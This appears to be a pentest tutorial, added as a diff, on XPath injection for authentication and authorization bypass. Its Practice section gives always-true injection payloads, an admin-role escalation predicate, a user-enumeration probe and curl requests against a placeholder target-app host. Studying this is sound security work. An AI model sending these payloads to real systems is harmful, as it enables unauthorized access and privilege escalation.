@@ -1,0 +1,84 @@
+---
+title: XPath Injection for Authentication Bypass
+description: Explore how XPath injection can bypass authentication and authorization
+  in web apps.
+keywords:
+- XPath injection
+- authentication bypass
+- authorization bypass
+- privilege escalation
+- web security
+---
+
+# Authentication and Authorization Bypass
+
+## Context
+
+    In the world of web security, exploiting XPath injection vulnerabilities can be a strategic maneuver to bypass authentication and authorization mechanisms. This article demonstrates how an attacker can exploit such vulnerabilities in web applications, effectively bypassing these critical security controls. You should already be familiar with XPath query structure and syntax, web application authentication and authorization flows, and general XPath injection techniques.
+
+## Theory
+
+### Authentication Logic Vulnerabilities in XPath Contexts
+
+    Authentication bypass via XPath occurs when an application uses unsanitized user input in XPath queries, making it vulnerable to crafted payloads that manipulate the query to always return true. This allows attackers to gain unauthorized access without providing valid credentials. A typical attack sequence submits input that alters the query logic to match any user node, thereby granting access.
+
+### Authorization and Privilege Escalation via XPath Injection
+
+    Authorization bypass exploits rely on altering the XPath logic used to verify roles or permissions, enabling attackers to access restricted resources or escalate their privileges. Applications that leverage XPath for these checks can be subverted by injecting conditions that evaluate to true, impersonating privileged users or escalating roles via payloads designed to alter the query's logic.
+
+### User Enumeration and Session Bypass via XPath
+
+    XPath injection can reveal valid usernames or session tokens by observing the application's responses to crafted queries. Through iterative payload injections, attackers can manipulate predicates to enumerate users or bypass session checks, leveraging differences in responses to distinguish valid from invalid users.
+
+## Practice
+
+### Bypassing Login Authentication with Always-True XPath Injection
+
+    - Inject an always-true predicate in the username field:
+        ```http
+        ' or '1'='1
+        ```
+    - Send the payload to the login endpoint:
+        ```bash
+        curl -X POST -d "username=' or '1'='1&password=irrelevant" http://target-app/login
+        ```
+    - Outcome: access is granted without valid credentials.
+
+### Privilege Escalation by Injecting Admin Role in XPath Query
+
+    - Target the role check with a crafted predicate:
+        ```http
+        ' or role='admin' or '1'='1
+        ```
+    - Submit the payload through the role-controlled parameter.
+    - Outcome: application assigns admin-level privileges to the attacker session.
+
+### User Enumeration via XPath Error Responses
+
+    - Probe username validation with:
+        ```http
+        admin' or '1'='2
+        ```
+    - Capture the application response while sending the request:
+        ```bash
+        curl -X POST -d "username=admin' or '1'='2&password=foo" http://target-app/login
+        ```
+    - Outcome: differences in error handling reveal valid usernames or IDs.
+
+### Authorization Matrix Bypass via XPath Predicate Manipulation
+
+    - Force the authorization predicate to true:
+        ```http
+        ' or '1'='1
+        ```
+    - Leverage an authenticated session cookie while tampering with a resource parameter:
+        ```bash
+        curl -b "session=attacker" "http://target-app/restricted?resource=' or '1'='1"
+        ```
+    - Outcome: restricted resources are returned without proper authorization.
+
+## Tools
+
+    - **curl**
+    - **Burp Suite**
+    - **OWASP ZAP**
